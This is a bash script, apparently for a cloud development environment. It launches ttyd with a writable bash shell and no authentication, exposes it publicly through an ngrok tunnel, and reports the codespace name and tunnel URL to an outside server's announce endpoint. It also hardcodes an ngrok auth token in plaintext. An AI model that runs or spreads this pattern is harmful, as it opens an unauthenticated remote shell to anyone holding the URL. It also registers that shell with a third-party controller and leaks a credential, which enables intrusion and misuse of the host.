#!/bin/bash

# ============================================
# CONFIG
# ============================================
SERVER_URL="https://1f2e4a0b33d9.ngrok-free.app"

# Set ngrok auth token directly
export NGROK_AUTHTOKEN="2dhRXz9FsZwjyGX2ZLnD1_4huFNb9Rs5JABSQA67CSz"

echo "Starting terminal services..."
echo "Server URL: $SERVER_URL"
echo "Codespace: $CODESPACE_NAME"

# Start ttyd in background
echo "Starting ttyd on port 7681..."
pkill ttyd 2>/dev/null || true
nohup ttyd -p 7681 -W bash > /tmp/ttyd.log 2>&1 &
sleep 2

# Start ngrok in background
echo "Starting ngrok tunnel..."
pkill ngrok 2>/dev/null || true
ngrok config add-authtoken $NGROK_AUTHTOKEN
nohup ngrok http 7681 --log=stdout > /tmp/ngrok.log 2>&1 &
sleep 5

# Get ngrok public URL from API
echo "Getting ngrok URL..."
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')

if [ -z "$NGROK_URL" ] || [ "$NGROK_URL" == "null" ]; then
  echo "✗ Failed to get ngrok URL"
  echo "ngrok log:"
  cat /tmp/ngrok.log
  exit 1
fi

echo "✓ ngrok URL: $NGROK_URL"

# Announce to server
echo "Announcing to server..."
curl -X POST "$SERVER_URL/api/announce" \
  -H "Content-Type: application/json" \
  -d "{\"codespace\": \"$CODESPACE_NAME\", \"url\": \"$NGROK_URL\"}"

echo ""
echo "✓ Terminal ready!"
echo "  ttyd: http://localhost:7681"
echo "  ngrok: $NGROK_URL"